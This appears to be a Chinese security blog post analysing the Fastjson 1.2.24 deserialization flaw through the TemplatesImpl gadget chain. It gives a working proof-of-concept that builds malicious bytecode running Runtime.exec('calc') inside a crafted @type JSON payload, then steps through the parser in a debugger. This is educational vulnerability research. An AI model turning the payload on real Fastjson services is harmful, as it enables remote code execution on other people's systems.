<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Fastjson反序列化(2)-TemplatesImpl利用链 | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="西郊有密林，助君出重围。">
    <meta name="keywords" content="Web安全 | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/20.d3ad9048.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/11.aa0a0e27.js"><link rel="prefetch" href="/assets/js/12.f76d046e.js"><link rel="prefetch" href="/assets/js/13.e7eb76d3.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js"><link rel="prefetch" href="/assets/js/9.e2574eb5.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>php安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>python安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Java安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/776e20/" class="sidebar-link">Java反射特性摘要</a></li><li><a href="/pages/e7ad5e/" class="sidebar-link">Java反序列化-URLDNS</a></li><li><a href="/pages/412e86/" class="sidebar-link">Java反序列化-CC1</a></li><li><a href="/pages/9856ab/" class="sidebar-link">Java反序列化-CC5</a></li><li><a href="/pages/1f3086/" class="sidebar-link">Java反序列化-CC6</a></li><li><a href="/pages/32905c/" class="sidebar-link">Fastjson(1)-初探以及利用方式</a></li><li><a href="/pages/4c60b9/" aria-current="page" class="active sidebar-link">Fastjson(2)-TemplatesImpl利用链</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/4c60b9/#前言" class="sidebar-link">前言</a></li><li class="sidebar-sub-header"><a href="/pages/4c60b9/#基于templatesimpl" class="sidebar-link">基于TemplatesImpl</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/4c60b9/#环境配置" class="sidebar-link">环境配置</a></li><li class="sidebar-sub-header"><a href="/pages/4c60b9/#poc-1" class="sidebar-link">POC(1)</a></li><li class="sidebar-sub-header"><a href="/pages/4c60b9/#poc-1-分析" class="sidebar-link">POC(1)分析</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/4c60b9/#基于jdbcrowsetimpl的jndi" class="sidebar-link">基于JdbcRowSetImpl的JNDI</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/4c60b9/#环境配置-2" class="sidebar-link">环境配置</a></li></ul></li></ul></li><li><a href="/pages/5d070a/" class="sidebar-link">谈一谈Java动态加载字节码</a></li><li><a href="/pages/152581/" class="sidebar-link">RMI与JNDI（一）</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>其他</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>技术文章</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>Java安全</span></li></ul> <div class="info" data-v-f945b7fe><div title="作者" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-12-01</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">
          Fastjson反序列化(2)-TemplatesImpl利用链
        </h1> <div class="theme-vdoing-content content__default"><h2 id="前言"><a href="#前言" class="header-anchor">#</a> 前言</h2> <p>在Fastjson版本为1.2.22-1.2.24的时候存在反序列化漏洞，这个漏洞可以基于两种利用方式：</p> <ul><li>基于TemplatesImpl的恶意字节码</li> <li>基于JdbcRowSetImpl的JNDI</li></ul> <p>下面笔者会就这两种利用方式来对这个漏洞进行调试分析。</p> <h2 id="基于templatesimpl"><a href="#基于templatesimpl" class="header-anchor">#</a> 基于TemplatesImpl</h2> <h3 id="环境配置"><a href="#环境配置" class="header-anchor">#</a> 环境配置</h3> <div class="custom-block note"><p class="custom-block-title">环境</p> <ul><li>Fastjson 1.2.22-1.2.24（笔者使用的是1.2.24）</li> <li>JDK 8u101</li></ul></div> <div class="custom-block tip"><p class="custom-block-title">POC用的额外的jar包</p> <ul><li>commons-codec-1.9（用于对class文件进行base64编码）</li> <li>javassist（用于生成恶意字节码文件）</li></ul></div> <h3 id="poc-1"><a href="#poc-1" class="header-anchor">#</a> POC(1)</h3> <p>笔者这里先把poc放下面，之后再进行调试分析：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">/*
        利用javassist来生成恶意字节码
         */</span>
        <span class="token comment">// 获取类池对象</span>
        <span class="token class-name">ClassPool</span> aDefault <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 向类池中添加类</span>
        aDefault<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> calc <span class="token operator">=</span> aDefault<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">&quot;Calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span><span class="token punctuation">;</span>
        <span class="token comment">// 生成恶意static代码块</span>
        calc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        calc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>aDefault<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取字节数组</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> calc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取恶意字节码</span>
        <span class="token class-name">String</span> base64ClassString <span class="token operator">=</span> <span class="token class-name">Tools</span><span class="token punctuation">.</span><span class="token function">getBase64String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 生成payload</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl','_bytecodes':['&quot;</span> <span class="token operator">+</span> base64ClassString <span class="token operator">+</span> <span class="token string">&quot;'],'_name':'f4de','_tfactory':{},'_outputProperties':{}}&quot;</span><span class="token punctuation">;</span>
        payload <span class="token operator">=</span> <span class="token class-name">Tools</span><span class="token punctuation">.</span><span class="token function">processString</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 进行反序列化</span>
        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Feature</span><span class="token punctuation">.</span><span class="token class-name">SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>为了方便写POC，笔者额外写了一个<code>Tools</code>类来对payload进行处理：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Tools</span> <span class="token punctuation">{</span>
    <span class="token comment">/*
    处理json字符串，用&quot;来替换'
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">processString</span><span class="token punctuation">(</span><span class="token class-name">String</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        string <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">&quot;'&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> string<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
    根据class文件的路径生成base64字符串
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getBase64String</span><span class="token punctuation">(</span><span class="token class-name">String</span> classPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>classPath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
    根据字节数组直接生成base64字符串
    建议搭配javassist来使用
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getBase64String</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>运行POC：</p> <p><img src="https://i.loli.net/2020/12/01/o6vlbcxQXwkpEZV.png" alt="image-20201201112355907"></p> <h3 id="poc-1-分析"><a href="#poc-1-分析" class="header-anchor">#</a> POC(1)分析</h3> <h4 id="限制条件"><a href="#限制条件" class="header-anchor">#</a> 限制条件</h4> <ul><li>必须开启<code>Feature.SupportNonPublicField</code>才能RCE成功</li></ul> <h4 id="前置知识"><a href="#前置知识" class="header-anchor">#</a> 前置知识</h4> <p>如果调试过CC链的朋友应该都知道CC2就是基于恶意字节码来进行利用的，利用点在于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类。在这里也是利用了同样的方式，如果不熟悉也没关系，我们下面对这个类进行简单的分析：</p> <p>这个类中的成员变量大多是被<code>private</code>所修饰，其中漏洞的利用点在<code>_bytecodes</code>和<code>_outputProperties</code>这两个成员变量。</p> <p>先看<code>_outputProperties</code>的构造方法<code>getOutputProperties()</code>：</p> <p><img src="https://i.loli.net/2020/12/01/pklSj5KJ4wIBEv7.png" alt="image-20201201114210585"></p> <p>这里调用了<code>newTransformer()</code>这个方法，继续跟进：</p> <p><img src="https://i.loli.net/2020/12/01/1QEmt7grl4eTAVK.png" alt="image-20201201115122002"></p> <p>接着调用了<code>getTransletInstance()</code>，继续跟进：</p> <p><img src="https://i.loli.net/2020/12/01/aZFEKO9R5HYqnMD.png" alt="image-20201201191844480"></p> <p>再跟进<code>defineTransletClasses()</code>:</p> <p><img src="https://i.loli.net/2020/12/01/p65Gm1gCRJzBN9w.png" alt="image-20201201192042667"></p> <p>在这个方法中会对<code>_bytecodes[]</code>这个字节数组进行<code>defineClass</code>处理，作用就是把字节码文件还原成一个类，并把结果赋值给<code>_class[i]</code>。但是在还原的过程中不会调用这个类的构造函数和<code>static</code>静态代码块，只有显式的调用其构造函数，构造方法和类初始化代码块才会被执行，所以我们再回到<code>getTransletInstance()</code>方法：</p> <p><img src="https://i.loli.net/2020/12/01/o2IHunrlktGDpEi.png" alt="image-20201201193040393"></p> <p>在这里调用了<code>_class[]</code>数组中的类中的构造方法和类的初始化代码块。</p> <p>由于篇幅所限，又涉及到了Java字节码的知识，这里就只能对它进行简单的分析，如果有机会以后会写一篇文章来详细说一下Java字节码。</p> <h4 id="分析"><a href="#分析" class="header-anchor">#</a> 分析</h4> <p>直接在最后一行的<code>JSON.parseObject</code>打下断点，先跟进到<code>JSON.parse</code>方法，此时的函数调用栈如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>parse:136, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parseObject:197, JSON (com.alibaba.fastjson)
main:34, Demo (com.demo2)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="https://i.loli.net/2020/12/04/X7gauLkTonO1dh8.png" alt="image-20201204165337062"></p> <p>这里的会根据生成的parser来进行解析，先跟进该类的的构造方法看一下：</p> <p><img src="https://i.loli.net/2020/12/04/mYp8lrISvVqfa5X.png" alt="image-20201204165438506"></p> <p>调用了<code>JSONScanner</code>的构造方法生成该类的实例，这个对象是用于词法解析的，跳出这个方法然后再回到<code>DefaultJSONParser</code>，继续跟进<code>this()</code>：</p> <p><img src="https://i.loli.net/2020/12/04/vlp3jqQFMwcRIiu.png" alt="image-20201204170121458"></p> <p>这里会拿到JSON文本的第一个字符<code>{</code>，然后<code>lexer.next()</code>方法会把JSONScanner（以下简称扫描器）的解析指针往后移一位：</p> <p><img src="https://i.loli.net/2020/12/04/YwIG1B4x68lbW7T.png" alt="image-20201204171106132"></p> <p>然后再设置token为12。再往下跟进到<code>DefaultJSONParser.parse</code>，此时调用栈如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>parse:1306, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parseObject:197, JSON (com.alibaba.fastjson)
main:34, Demo (com.demo2)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>跟进该方法：</p> <p><img src="https://i.loli.net/2020/12/04/CEDG4aVbx1eQAN6.png" alt="image-20201204171502845"></p> <p>这里会根据我们之前获取的token来进入不同的case分支，由于我们的token是12，所以进入了这里：</p> <p><img src="https://i.loli.net/2020/12/04/vq5Ny791ArEIHYU.png" alt="image-20201204171559424"></p> <p>接着跟进<code>parseObject</code>：</p> <p><img src="https://i.loli.net/2020/12/04/xca5QF4PJTdRMou.png" alt="image-20201204171711945"></p> <p>扫描器的<code>scanSymbol</code>方法会把我们第一个键名<code>@type</code>扫描出来，然后根据<code>@type</code>进入这里：</p> <p><img src="https://i.loli.net/2020/12/04/SzWsMkjplRKe17w.png" alt="image-20201204172310392"></p> <p>这里的<code>scanSymbol</code>会扫描出<code>@type</code>所指定的类，这里是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，然后调用<code>TypeUtils.loadClass</code>加载该类到缓存中并返回这个类（这里先不详细展开说，后面说补丁绕过会具体跟进这个方法调试）。</p> <p>当我们获取到这个类之后再往下调试，这里会根据获取到的clazz来获取对应的deserializer：</p> <p><img src="https://i.loli.net/2020/12/04/lgrizUBuw18NOfd.png" alt="image-20201204172836744"></p> <p>跟进该方法调试到如下位置：</p> <p><img src="https://i.loli.net/2020/12/04/jS8XPpKuR2srg6z.png" alt="image-20201204173912481"></p> <p>此时函数调用栈如下：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>createJavaBeanDeserializer<span class="token operator">:</span><span class="token number">526</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
getDeserializer<span class="token operator">:</span><span class="token number">461</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
getDeserializer<span class="token operator">:</span><span class="token number">312</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">367</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1327</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1293</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">137</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">193</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token class-name">Demo</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>demo2<span class="token punctuation">)</span>
